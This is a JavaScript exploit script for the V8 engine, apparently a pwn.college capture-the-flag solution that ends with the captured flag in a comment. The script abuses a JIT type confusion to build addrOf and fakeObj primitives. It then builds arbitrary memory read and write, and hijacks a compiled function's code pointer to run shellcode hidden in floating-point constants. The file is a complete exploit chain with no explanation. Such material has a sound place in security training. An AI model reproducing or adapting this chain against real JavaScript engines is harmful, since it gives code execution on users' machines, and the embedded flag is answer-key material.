var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);
var u32_buf = new Uint32Array(buf);

function f2i(val) {
    f64_buf[0] = val;
    return u64_buf[0];
}

function i2f(val) {
    u64_buf[0] = BigInt(val);
    return f64_buf[0];
}

function i2u_lo(i) {
    u64_buf[0] = BigInt(i);
    return u32_buf[0];
}

function i2u_hi(i) {
    u64_buf[0] = BigInt(i);
    return u32_buf[1];
}

function u2f(lo, hi) {
    u32_buf[0] = lo;
    u32_buf[1] = hi;
    return f64_buf[0];
}

function u2i(lo, hi) {
    u32_buf[0] = lo;
    u32_buf[1] = hi;
    return u64_buf[0];
}

const logInfo = (m) => console.log(`[*] ${m}`);
const logOK = (m) => console.log(`[+] ${m}`);
const logErr = (m) => console.log(`[-] ${m}`);

function toHex(x, w = 16) {
    x = BigInt.asUintN(64, BigInt(x));
    return "0x" + x.toString(16);
}

function assert(c) {
    if (!c) {
        throw "Assertion Failed";
    }
}

function shellcode() {
    return [1.9995716422075807e-246, 1.9710255944286777e-246, 1.97118242283721e-246, 1.971136949489835e-246, 1.9711826272869888e-246, 1.9711829003383248e-246, -9.254983612527998e+61];
}

for (let i = 0; i < 1000; i++) shellcode();

function AddrOf(target) {
    let trigger_flag;
    let arr;

    function transition() {
        if (trigger_flag) {
            arr[1] = target;
        }
    }

    function opt(arr, i) {
        for (let j = 0; j < 1000000; j++);
        arr[0] = 1.1;
        if (trigger_flag || i < 1)
            transition();
        return arr[0];
    }

    trigger_flag = false;
    for (let i = 0; i < 1000; i++) {
        arr = [1.1, 2.2];
        opt(arr, i);
    }

    // %DebugPrint(arr);
    trigger_flag = true;
    arr = [1.1, 2.2];
    f64_buf[0] = opt(arr, 0);
    // %DebugPrint(arr);
    // %DebugPrint(f64_buf[0]);
    // %SystemBreak();
    return u32_buf[1];
}

function FakeObj(addr) {
    let trigger_flag;
    let arr;

    function transition() {
        if (trigger_flag) {
            arr[1] = {};
        }
    }

    function opt(arr, i) {
        for (let j = 0; j < 1000000; j++);
        arr[0] = 1.1;
        if (trigger_flag || i < 1)
            transition();
        arr[0] = u2f(addr, 0);
    }

    trigger_flag = false;
    for (let i = 0; i < 1000; i++) {
        arr = [1.1, 2.2];
        opt(arr, i);
    }

    trigger_flag = true;
    arr = [1.1, 2.2];
    opt(arr, 0);
    return arr[0];
}

// %DebugPrint(shellcode);
let shellcode_addr = AddrOf(shellcode);
logOK(`shellcode addr: ${toHex(shellcode_addr)}`);

let fake_double_map_addr = 0x1cb7f9;
logInfo(`fake_double_map_addr: ${toHex(fake_double_map_addr)}`);

let fake_arr = [u2f(fake_double_map_addr, 0), u2f(shellcode_addr, 100)];
let fake_arr_addr = AddrOf(fake_arr);
logOK(`fake_arr addr: ${toHex(fake_arr_addr)}`);

let fake_obj = FakeObj(fake_arr_addr + 0x54);
// %DebugPrint(fake_obj);

function arbRead(addr) {
    fake_arr[1] = u2f(addr - 8, 100);
    return f2i(fake_obj[0]);
}

function arbWrite(addr, val) {
    fake_arr[1] = u2f(addr - 8, 100);
    fake_obj[0] = i2f(val);
}

let code_addr = i2u_lo(arbRead(shellcode_addr + 0xc));
logOK(`code addr: ${toHex(code_addr)}`);

let rwx_addr = arbRead(code_addr + 0x14);
logOK(`rwx addr: ${toHex(rwx_addr)}`);

arbWrite(code_addr + 0x14, rwx_addr + 0x69n + 0x2n);

// %SystemBreak();
shellcode();
// pwn.college{YmXWqP1wsBYF__DimSyH5Quj-wW.dBDM4UDL1MTNzYzW}
